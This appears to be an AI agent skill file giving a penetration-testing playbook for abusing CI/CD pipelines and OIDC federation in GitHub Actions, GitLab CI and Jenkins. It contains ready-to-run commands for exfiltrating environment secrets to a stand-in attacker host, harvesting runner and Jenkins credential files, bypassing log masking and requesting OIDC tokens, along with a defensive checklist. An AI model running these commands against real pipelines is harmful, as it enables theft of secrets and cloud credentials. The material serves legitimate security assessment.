---
name: abusing-ci-cd-oidc
description: Exploit CI/CD pipeline misconfigurations and OIDC federation weaknesses across GitHub Actions, GitLab CI, and Jenkins -- poisoned workflows, secret exfiltration, runner compromise, overly broad OIDC trust policies, build artifact poisoning, and credential theft. Use when pentesting CI/CD infrastructure, assessing OIDC federation trust boundaries, reviewing pipeline security posture, or exploiting a path from repository access to cloud credentials.
verified: 2026-07-27
---

# Abusing CI/CD Pipelines and OIDC Federation

CI/CD pipelines are high-privilege execution environments, often with direct
cloud IAM access, deploy credentials, and signing keys. OIDC federation turns
a repository write into cloud credential issuance when the trust policy is too
broad. A single misconfigured workflow or a wildcard subject claim can bridge
the gap from "can open a pull request" to "has production cloud access."

## When to Use

- Assessing GitHub Actions, GitLab CI, or Jenkins for exploitable misconfigurations
- Testing OIDC federation trust policies between CI providers and cloud platforms
- Extracting secrets, tokens, or credentials from pipeline execution environments
- Evaluating self-hosted runner isolation and shared runner risk
- Attempting lateral movement from CI/CD into cloud accounts via OIDC
- Reviewing build artifact integrity and cache poisoning attack surface

## When NOT to Use

- **Dependency and package supply chain attacks** -- use `auditing-supply-chain`
- **Cloud IAM exploitation not originating from CI/CD** -- use `exploiting-cloud-platforms`
- **Static code review of pipeline definitions as pure source** -- use `auditing-code-for-vulnerabilities`

## GitHub Actions

### Poisoned Workflows

`pull_request_target` runs in the base repo context with secrets and a
write-scoped `GITHUB_TOKEN`, but can be triggered by a fork PR.

```bash
# Find pull_request_target triggers that check out PR head code
rg -n 'pull_request_target' -A20 .github/workflows/ | rg 'checkout|ref.*head'

# Script injection: untrusted PR/issue data interpolated into run blocks
rg -n '\$\{\{\s*github\.event\.(issue|pull_request|comment|review)' .github/workflows/
```

**Attack pattern:** fork the repo, modify the checked-out code path (build
script, Makefile, test harness), open a PR. The workflow executes your code
with the base repo's secrets. Exfiltrate via DNS, HTTP callback, or artifact.

### Secret Exfiltration and Token Scope

```bash
# Secrets are in the environment -- exfiltrate out-of-band
env | base64 | curl -d @- https://attacker.example/exfil

# GITHUB_TOKEN scope check
curl -s -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/repos/OWNER/REPO -I | grep 'x-oauth-scopes'

# Check if permissions are restricted in the workflow
rg -n 'permissions:' .github/workflows/
rg -n 'permissions:\s*write-all' .github/workflows/
```

Unrestricted `GITHUB_TOKEN` defaults to read+write on contents, packages, and
more. With a write-scoped token: push to branches, create releases, modify
packages, approve deployments.

### Self-Hosted Runner Compromise

Self-hosted runners on public repos are a critical finding. They persist
between jobs, so a malicious workflow leaves implants for subsequent jobs.

```bash
rg -n 'runs-on:.*self-hosted' .github/workflows/

# On a compromised runner: harvest credentials from prior jobs
find / -name '.credentials' -o -name '.env' -o -name '*.pem' 2>/dev/null
cat /home/runner/.aws/credentials
```

### Artifact Poisoning

```bash
# If a PR workflow uploads build artifacts consumed by a deploy workflow,
# the PR author controls what gets deployed
rg -n 'upload-artifact|download-artifact' .github/workflows/
```

## GitLab CI

### Runner Tokens and Shared Runners

```bash
# Exposed runner registration tokens allow registering rogue runners
rg -rn 'RUNNER_TOKEN\|REGISTRATION_TOKEN\|CI_JOB_TOKEN' .gitlab-ci.yml

# CI_JOB_TOKEN can access other projects if inter-project deps are configured
curl --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://gitlab.example/api/v4/projects/OTHER_ID/repository/files/secret.txt/raw?ref=main"

# Shared runners: Docker socket mount leaks between jobs
rg -n 'docker:dind\|/var/run/docker.sock' .gitlab-ci.yml
```

### CI Variables Extraction

```bash
# Masked variables are hidden from logs but present in env
printenv > /tmp/all_vars.txt && cat /tmp/all_vars.txt

# Protected variables: only on protected branches/tags
# Push a tag matching the protection pattern to access them
git tag release-exploit && git push origin release-exploit
```

## OIDC Federation Abuse

OIDC federation lets CI jobs assume cloud roles without stored credentials.
The security boundary is the trust policy's subject claim filter.

### Overly Broad Subject Claims

```bash
# AWS: inspect IAM role trust policy conditions
aws iam get-role --role-name ci-deploy-role \
  --query 'Role.AssumeRolePolicyDocument' --output json

# Dangerous patterns in the Condition block:
# "sub": "repo:org/*"                     -- any repo in the org
# "sub": "repo:org/repo:*"                -- any branch, any environment
# "sub": "repo:org/repo:ref:refs/heads/*" -- any branch
# No Condition at all                      -- any token from the IdP
```

**Vulnerable AWS trust policy:**
```json
{
  "Effect": "Allow",
  "Principal": {"Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"},
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:org-name/*"
    }
  }
}
```

Any repo in the org can assume this role. Abandoned repos, docs repos, and
repos with loose contributor policies become pivots to production cloud access.

### GCP and Azure

```bash
# GCP: check attribute conditions on workload identity provider
gcloud iam workload-identity-pools providers describe PROVIDER \
  --location=global --workload-identity-pool=POOL
# Vulnerable: no attribute condition, or condition matching only the org

# Azure: list federated identity credentials
az ad app federated-credential list --id APP_OBJECT_ID
# Same wildcard risks: "repo:org/*" or "repo:org/repo:ref:refs/heads/*"
# Safe: "repo:org/repo:environment:production"
```

### Environment Protection Bypass

Environment protection rules gate OIDC token issuance only if the trust policy
conditions include `:environment:`. A policy matching `repo:org/repo:*` ignores
environments, so required reviewers provide no protection.

```bash
rg -n 'environment:' .github/workflows/
# Compare to the trust policy Condition -- if it lacks :environment:, bypass
```

## Jenkins

### Groovy Console and Credentials

```bash
# Script console (/script) runs arbitrary Groovy as SYSTEM
# Check for unauthenticated access
curl -s -o /dev/null -w "%{http_code}" http://jenkins.target/script

# Credential files on disk
cat /var/lib/jenkins/credentials.xml
cat /var/lib/jenkins/secrets/master.key
cat /var/lib/jenkins/secrets/hudson.util.Secret
```

### Pipeline Library Injection

```bash
# Shared libraries via @Library execute in the pipeline sandbox
# If the library repo is writable, inject code into vars/ or src/
rg -n '@Library\|library\(' Jenkinsfile

# "Load implicitly" enabled = every pipeline runs the library's code
```

## Secrets in CI

### Extracting Masked Variables

```bash
# Masking hides secrets from logs but not from the process environment
echo "$SECRET_VAR" | base64                    # bypass log masking
echo "$SECRET_VAR" | sed 's/./&\n/g'           # char-by-char bypass
echo "$SECRET_VAR" > secret_dump.txt           # write to artifact
```

### OIDC Token Interception

```bash
# GitHub Actions: request the OIDC token
curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com"

# JWT is reusable until expiry (typically 5-15 minutes)
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```

### Long-Lived Tokens as CI Secrets

```bash
# Credentials that should have been replaced by OIDC
env | grep -i 'AWS\|AKIA'                     # AWS access keys
env | grep -i 'AZURE\|ARM_CLIENT'             # Azure SP credentials
find / -name '*service*account*.json' 2>/dev/null  # GCP SA keys
```

## Build Artifact Poisoning

### Cache Poisoning

```bash
# CI caches shared across branches -- a PR can poison the main-branch cache
rg -n 'actions/cache' -A5 .github/workflows/
# Check whether cache keys include dependency lock file hashes

rg -n 'cache:' -A10 .gitlab-ci.yml
# key: $CI_COMMIT_REF_SLUG is branch-scoped but forks may share
```

### Dependency Confusion via Internal Registries

```bash
# If CI resolves from both internal and public registries,
# a higher-version public package wins resolution
rg -rn 'registry\|index-url\|repository' .npmrc .yarnrc pip.conf pyproject.toml
# Non-scoped internal packages (@org/pkg format) are vulnerable
```

## Defensive Review Checklist

**OIDC subject claim strictness:**
- [ ] Trust policies pin to specific repository (not org-wide wildcard)
- [ ] Trust policies require specific branch or environment in the subject
- [ ] Environment protection rules are configured for production deployments

**Workflow approval gates:**
- [ ] `pull_request_target` workflows do not check out PR head code
- [ ] Fork PRs require approval before workflows run
- [ ] Required reviewers are set on deployment environments
- [ ] Branch protection prevents direct pushes to release branches

**Runner isolation:**
- [ ] Self-hosted runners are not used on public repositories
- [ ] Runners are ephemeral (destroyed after each job)
- [ ] Docker socket is not mounted into CI jobs

**Secrets hygiene:**
- [ ] No long-lived cloud credentials stored as CI secrets (use OIDC)
- [ ] `GITHUB_TOKEN` permissions are explicitly restricted per-job
- [ ] Secrets are not available to fork-triggered workflows

**Build integrity:**
- [ ] Third-party actions/images are pinned by SHA, not mutable tag
- [ ] Cache keys include dependency lock file hashes
- [ ] Build artifacts are signed and verified before deployment
- [ ] Internal packages use scoped registries with no public fallback

## Rationalizations to Reject

- *"The OIDC trust policy is org-scoped, and we trust all our repos."*
  Any repo in the org becomes a pivot to cloud access. Abandoned repos,
  forks, and repos with loose contributor policies are all in scope.

- *"Secrets are masked in the logs."* Masking is a log-display feature,
  not a security boundary. Secrets are plaintext in the process environment.

- *"The workflow only runs on PRs from maintainers."* Unless fork PR
  approval is enforced at the repo or org level, external contributors
  can trigger `pull_request_target` workflows.

- *"Our runners are internal, so they are safe."* Internal runners that
  persist between jobs accumulate credentials from every job they execute.
  Ephemeral runners are the control.

- *"We use environment protection rules."* Protection rules only gate
  OIDC token issuance if the trust policy conditions include the environment
  claim. A policy matching `repo:org/repo:*` ignores environments entirely.

- *"It is just the CI token, it expires quickly."* A 15-minute OIDC token
  is enough to exfiltrate data, modify infrastructure, or establish
  persistence in the cloud account. Short-lived is not harmless.

- *"The pipeline code is reviewed before merge."* Review of the pipeline
  definition does not protect against `pull_request_target`, which runs
  the attacker's code before any merge.

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills-core/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Initial Access** (TA0001)

- [T1199](https://attack.mitre.org/techniques/T1199/) Trusted Relationship — see also `exploiting-cloud-platforms`, `attacking-entra-id`

**Credential Access** (TA0006)

- [T1552](https://attack.mitre.org/techniques/T1552/) Unsecured Credentials — see also `escalating-linux-privileges`, `exploiting-cloud-platforms`, `auditing-supply-chain`

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->

## References

- `auditing-supply-chain` -- dependency and package-level supply chain attacks
- `exploiting-cloud-platforms` -- cloud IAM exploitation beyond CI/CD origins
- `auditing-code-for-vulnerabilities` -- source-level review of pipeline code
- `engineering-detections` -- building alerts for CI/CD abuse patterns
